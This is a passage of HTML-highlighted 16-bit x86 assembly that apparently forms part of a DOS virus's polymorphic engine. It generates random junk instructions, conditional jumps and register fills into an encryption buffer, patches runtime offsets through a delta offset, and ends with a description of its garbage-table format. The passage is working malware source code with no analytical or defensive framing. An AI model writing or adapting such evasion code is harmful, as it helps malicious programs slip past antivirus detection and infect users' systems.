                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Read patch from table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; Get byte to patch</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">         </span><span class="sc1">; Get function to use</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">function_table</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Call function</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_do_patches</span><span class="sc0">
</span><span class="sc5">done_patches</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; Number of opcodes</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">     
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Number of patches</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Sub generated # from total garbage</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Inc buffer pointer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">           </span><span class="sc1">; opcodes+patches</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; SI points to next table entry</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">jmp_ofs</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Any jmp?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">all_garbage?</span><span class="sc0">    </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; Generating a jump?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">all_garbage?</span><span class="sc0">    </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                                        </span><span class="sc1">; else jmp is finished</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; garbage to gen + current offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">previous_ofs</span><span class="sc0"> </span><span class="sc1">; Save current offset</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; Sub jmp displacement from garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">jmp_ofs</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">all_garbage?</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; All garbage generated?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_garbage</span><span class="sc0">    </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_select_entry</span><span class="sc0">  </span><span class="sc1">; No? then jmp</span><span class="sc0">

</span><span class="sc5">exit_garbage</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">previous_ofs</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     


</span><span class="sc5">function_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">F_G_BYTE</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">generate_byte_word</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_OP_REG</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_op_reg</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_REG</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_reg</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_MODRM</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_modrm</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_RM</span><span class="sc0">                  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_rm</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_ADD_0_5</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">add_0_5</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_REGRMMOD</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_regrmmod</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_G_JXX</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">generate_jxx</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_G_WORD</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">generate_byte_word</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_REG_PRESERVE_MODRM</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_reg_preserve_modrm</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_RUNTIME_OFS</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_runtime_ofs</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_LAST_REG_SRC</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_last_reg_src</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">F_I_LAST_REG_DEST</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">insert_last_reg_dest</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">generate_byte_word</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..0FEh]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Store byte</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; Generating word?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ret_gen_b_w</span><span class="sc0">             </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..0FEh]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Store another byte</span><span class="sc0">
</span><span class="sc5">ret_gen_b_w</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_mod</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; [0..0EFh]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; AL:=(80h or 0)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; AL:=(40h or 0)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">; AL:=(0C0h or 0)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; 0   -&gt; register index</span><span class="sc0">
                                        </span><span class="sc1">; 0C0 -&gt; register to register</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..0EFh]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; Select register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reg_sp</span><span class="sc0">            </span><span class="sc1">; SP ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">insert_reg</span><span class="sc0">              </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">indexreg_op2</span><span class="sc0">      </span><span class="sc1">; Used as index ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">insert_reg</span><span class="sc0">              </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reg_counter</span><span class="sc0">       </span><span class="sc1">; Used as counter ?</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">insert_reg</span><span class="sc0">              </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Insert register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">unused_reg</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Save for later use</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">add_0_5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..5]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_rm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..7Fh]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">            </span><span class="sc1">; AL in [0..7]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000110b</span><span class="sc0">            </span><span class="sc1">; immediate address?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">insert_rm</span><span class="sc0">               </span><span class="sc1">; Yes? Skip it</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_modrm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">insert_mod</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">insert_rm</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_regrmmod</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">insert_reg</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; Register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">insert_rm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">insert_mod</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_op_reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                  </span><span class="sc1">; [0..0Eh]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; Operation</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; ADD, OR, ADC,...</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">insert_reg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">generate_jxx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; [0..0Fh]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; JO,JNO,JB,JNB,JE,JNE,JBE,JA,</span><span class="sc0">
                                                </span><span class="sc1">; JS,JNS,JP,JNP,JL,JLE,JG</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">garbagetogen</span><span class="sc0">      </span><span class="sc1">; Don't jmp out of garbage code</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..AX-1]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; jmp offset in [0..3Fh]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Write offset</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; Flag: generating cond. jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">jmp_ofs</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">jmp_ofs</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">          </span><span class="sc1">; Clear flag</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_reg_preserve_modrm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Read mod, r/m</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">insert_reg</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; Insert register</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">  </span><span class="sc1">; Previous mod, r/m</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_last_reg_src</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">unused_reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Insert register</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_runtime_ofs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; Destination offset</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">enc_buffer</span><span class="sc0">   </span><span class="sc1">; Offset in buffer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">delta_ofs</span><span class="sc0">    </span><span class="sc1">; Offset in runtime</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">insert_last_reg_dest</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">unused_reg</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Insert register</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; Garbage table format :</span><span class="sc0">
</span><span class="sc1">;   Each entry:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       ABh</span><span class="sc0">
</span><span class="sc1">;       |^Number of bytes in this blocks</span><span class="sc0">
</span><span class="sc1">;       Number of fix functions</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       CDh : 11111111b</span><span class="sc0">
</span><span class="sc1">;             ||^^^^^^Generation probabilty of this block when selected</span><span class="sc0">
</span><span class="sc1">;             |Can be in a loop? (1=yes)</span><span class="sc0">
</span><span class="sc1">;             Can be generated? (1=always, 0=depend of previous generations)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       EFh                     |</span><span class="sc0">
</span><span class="sc1">;       |^Byte to fix           | Number of fixes</span><span class="sc0">
</span><span class="sc1">;       Function to use         |</span><span class="sc0">
</span><span class="sc1">;       [...]                   |</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       GHh         (byte 0)    | List of opcodes in the block</span><span class="sc0">
</span><span class="sc1">;       [...]                   |</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

